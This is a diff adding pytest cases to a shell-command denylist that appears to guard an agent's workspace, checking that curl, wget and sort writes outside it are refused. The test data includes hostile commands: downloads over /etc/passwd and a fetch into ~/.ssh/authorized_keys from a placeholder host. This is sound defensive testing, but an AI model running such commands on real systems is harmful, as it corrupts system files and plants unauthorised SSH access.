@@ -431,3 +431,46 @@ def test_reading_a_file_outside_the_workspace_with_yq_is_not_refused(command: st
     # Reading is not writing, exactly as `sed -n '1,5p' /etc/hosts` is not.
     guard = Denylist(workspace_root=WORKSPACE, home=HOME)
     assert guard.check_command(command) == ()
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("curl -o /etc/passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("curl -o/etc/passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("curl --output=/etc/passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("curl --output-dir /etc -o passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("wget -O /etc/passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("wget --output-document=/etc/passwd http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("wget -P /etc http://x.test/p", DenyCode.OUTSIDE_WORKSPACE),
+        ("sort -o /etc/passwd f", DenyCode.OUTSIDE_WORKSPACE),
+        ("sort --output=/etc/passwd f", DenyCode.OUTSIDE_WORKSPACE),
+        ("curl -o ~/.ssh/authorized_keys http://x.test/k", DenyCode.SECRET_WRITE),
+    ],
+)
+def test_a_download_or_a_sort_that_writes_outside_the_workspace_is_refused(
+    command: str, expected: DenyCode
+) -> None:
+    """The path reaching the check is only half of it; it has to arrive as a *write*.
+
+    `curl` is not a write binary, so before this the target was resolved and then judged
+    as a read — and reading `/etc/passwd` is nobody's problem, so nothing fired. Writing
+    it is the whole point.
+    """
+    guard = Denylist(workspace_root=WORKSPACE, home=HOME)
+    assert expected in {hit.code for hit in guard.check_command(command)}
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -sS http://x.test/p",
+        "curl -o - http://x.test/p",
+        "wget -O- http://x.test/p",
+        "sort /etc/passwd",
+    ],
+)
+def test_fetching_or_reading_without_naming_a_file_is_not_refused(command: str) -> None:
+    # `sort /etc/passwd` reads it and prints; that was never the problem.
+    guard = Denylist(workspace_root=WORKSPACE, home=HOME)
+    assert guard.check_command(command) == ()
